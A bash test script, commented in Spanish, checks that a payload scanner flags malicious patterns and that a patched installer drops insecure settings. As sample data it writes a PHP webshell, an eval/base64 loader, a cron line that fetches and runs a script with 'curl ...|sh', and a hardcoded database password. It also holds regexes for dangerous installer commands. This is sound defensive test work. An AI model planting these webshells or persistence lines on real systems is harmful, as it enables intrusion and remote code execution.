#!/usr/bin/env bash
#
# Pruebas del escáner. Construye un payload de muestra con patrones maliciosos
# conocidos y verifica que scan_payload.sh los detecta todos, y que un payload
# limpio NO genera críticos.
#
# Uso: ./tests/test_scan.sh
# Exit: 0 si todo pasa, 1 si hay regresiones.
#
set -uo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
SCAN="$ROOT/tools/scan_payload.sh"
PASS=0
FAIL=0

ok()   { PASS=$((PASS+1)); printf '  \033[0;32m✓\033[0m %s\n' "$1"; }
bad()  { FAIL=$((FAIL+1)); printf '  \033[0;31m✗\033[0m %s\n' "$1"; }

assert_sev() { # assert_sev <salida> <id> <descripción>
    if grep -q "$2" <<< "$1"; then ok "$2 detectado"; else bad "$2 NO detectado ($3)"; fi
}
assert_absent() {
    if grep -q "$2" <<< "$1"; then bad "$2 no debería aparecer ($3)"; else ok "$2 ausente, correcto"; fi
}

# ---------------------------------------------------------------------------
SAMPLE=$(mktemp -d)
trap 'rm -rf "$SAMPLE"' EXIT

mkdir -p "$SAMPLE/cms/shells" "$SAMPLE/cms/streams" "$SAMPLE/cms/inc" "$SAMPLE/bin" "$SAMPLE/lib"

# webshell clásica
printf '<?php $c=$_POST["cmd"]; system($c); ?>' > "$SAMPLE/cms/shells/w.php"
# eval + base64
printf '<?php eval(base64_decode("ZWNobyAxOw==")); ?>' > "$SAMPLE/cms/inc/e.php"
# credenciales conocidas + callback
printf '<?php $p="pglauD4F0L"; $u="https://valut.iptvtools.io/api/lic.php"; curl_init($u); ?>' \
    > "$SAMPLE/cms/lic.php"
# PHP en directorio de datos
printf '<?php shell_exec("id"); ?>' > "$SAMPLE/cms/streams/x.php"
# persistencia
printf 'crontab -l | { cat; echo "* * * * * curl http://x/y|sh"; } | crontab -\n' > "$SAMPLE/lib/persist.sh"
# binario con endpoint embebido
printf '\x7fELF\x02\x01\x01\x00 mid nuit\x00 https://valut.iptvtools.io/lic/check\x00' > "$SAMPLE/bin/php"
chmod +x "$SAMPLE/bin/php"
# archivo escribible por todos
printf 'data' > "$SAMPLE/lib/open.txt"; chmod 666 "$SAMPLE/lib/open.txt"
# blob de licencia
printf 'f40ed93c8db99e2537a1fb3ab77e50b175e9aed9' > "$SAMPLE/config"

echo
echo "== payload de muestra =="
OUT=$("$SCAN" "$SAMPLE" 2>&1); RC=$?
assert_sev "$OUT" "C-01" "ejecución dinámica"
assert_sev "$OUT" "C-03" "comandos del sistema"
assert_sev "$OUT" "C-06" "credenciales conocidas"
assert_sev "$OUT" "C-08" "llamadas de red"
assert_sev "$OUT" "C-09" "dominios de licencia"
assert_sev "$OUT" "C-11" "persistencia"
assert_sev "$OUT" "C-14" "archivos 666"
assert_sev "$OUT" "C-15" "PHP en directorio de datos"
assert_sev "$OUT" "C-20" "blob config"
[ "$RC" -eq 1 ] && ok "exit code 1 con hallazgos críticos" || bad "exit code esperado 1, obtenido $RC"

echo
echo "== payload limpio =="
CLEAN=$(mktemp -d)
mkdir -p "$CLEAN/cms"
printf '<?php echo "hola"; ?>' > "$CLEAN/cms/index.php"
printf 'nota\n' > "$CLEAN/README.txt"
COUT=$("$SCAN" "$CLEAN" 2>&1); CRC=$?
assert_absent "$COUT" "critical" "payload sin amenazas"
[ "$CRC" -eq 0 ] && ok "exit code 0 en payload limpio" || bad "exit code esperado 0, obtenido $CRC"
rm -rf "$CLEAN"

echo
echo "== --json =="
JOUT=$("$SCAN" "$SAMPLE" --json 2>&1)
if command -v python3 >/dev/null 2>&1; then
    if python3 -c 'import json,sys; d=json.load(open("/dev/stdin")); assert d["summary"]["critical"]>=1; assert any(f["id"]=="C-03" for f in d["findings"])' <<< "$JOUT" 2>/dev/null; then
        ok "JSON parseable y con C-03"
    else
        bad "el JSON no es parseable o le falta C-03"
    fi
else
    grep -q '"id":"C-03"' <<< "$JOUT" && ok "JSON contiene C-03" || bad "JSON sin C-03"
fi

echo
echo "== instalador =="
bash -n "$ROOT/installer/ms_install_offline.sh" \
    && ok "installer/ sintaxis válida" || bad "installer/ tiene errores de sintaxis"
bash -n "$ROOT/upstream/ms_install_offline.sh" \
    && ok "upstream/ sintaxis válida (copia fiel)" || bad "upstream/ tiene errores de sintaxis"

if diff -q "$ROOT/upstream/ms_install_offline.sh" "$ROOT/installer/ms_install_offline.sh" >/dev/null 2>&1; then
    bad "installer/ es idéntico a upstream/: no se aplicó ningún parche"
else
    ok "installer/ difiere de upstream/ (parches aplicados)"
fi

# Patrones que NUNCA deben quedar activos (fuera de comentarios) en installer/.
# Se comprueba línea a línea: si una línea los contiene y no es comentario -> fallo.
scan_active() { # scan_active <regex> <descripción>
    local hits
    hits=$(grep -nE "$1" "$ROOT/installer/ms_install_offline.sh" \
        | grep -vE ':[[:space:]]*#' \
        | grep -vE 'HARDENING|H-[0-9]{2}' || true)
    if [ -n "$hits" ]; then
        bad "patrón activo en installer/: $2"
        printf '       %s\n' "$(head -3 <<< "$hits")"
    else
        ok "eliminado o solo en comentario: $2"
    fi
}

scan_active "setenforce[[:space:]]+0"                "setenforce 0"
scan_active "NOPASSWD:ALL"                           "sudo NOPASSWD:ALL"
scan_active "GRANT .*@'%'"                           "GRANT a @'%'"
scan_active "GRANT SUPER ON \*\.\*"                 "GRANT SUPER global"
scan_active "\[trusted=yes\]"                        "repos apt sin firma"
scan_active "pglauD4F0L"                             "password de BD hardcodeada"
scan_active "hn6SImdyx7|dtqVa5xwoU|02230129b6ad"     "claves del panel hardcodeadas"
scan_active "rm -rf \*"                              "rm -rf *"
scan_active "pkill -9"                               "pkill -9"
scan_active "cron\.\*[[:space:]]+stop"               "silenciar logs de cron"
scan_active "size=90%"                               "tmpfs al 90%"
scan_active "mode=0777"                              "tmpfs 0777"
scan_active "chmod -R 755 /etc/mysql/ssl"            "chmod 755 de la clave MySQL"

# El único @'%' admitido es el DROP USER que limpia el usuario inseguro.
if grep -qE "DROP USER IF EXISTS 'midnightstreamer'@'%'" "$ROOT/installer/ms_install_offline.sh"; then
    ok "DROP USER @'%' presente (limpia el usuario inseguro del original)"
else
    bad "falta el DROP USER @'%' que elimina el usuario abierto"
fi

# Debe existir bind-address loopback.
if grep -qE '^[[:space:]]*bind-address[[:space:]]*=[[:space:]]*127\.0\.0\.1' "$ROOT/installer/ms_install_offline.sh" \
   || grep -q "bind-address.*127.0.0.1" "$ROOT/installer/ms_install_offline.sh"; then
    ok "bind-address 127.0.0.1 presente"
else
    bad "falta bind-address 127.0.0.1"
fi

# La verificación de checksum debe ser obligatoria.
if grep -q 'MS_PAYLOAD_SHA256' "$ROOT/installer/ms_install_offline.sh"; then
    ok "verificación de checksum del payload presente"
else
    bad "falta la verificación de checksum"
fi

echo
echo "---------------------------------------------"
printf ' pasadas: %d   fallidas: %d\n' "$PASS" "$FAIL"
echo "---------------------------------------------"
[ "$FAIL" -eq 0 ] || exit 1
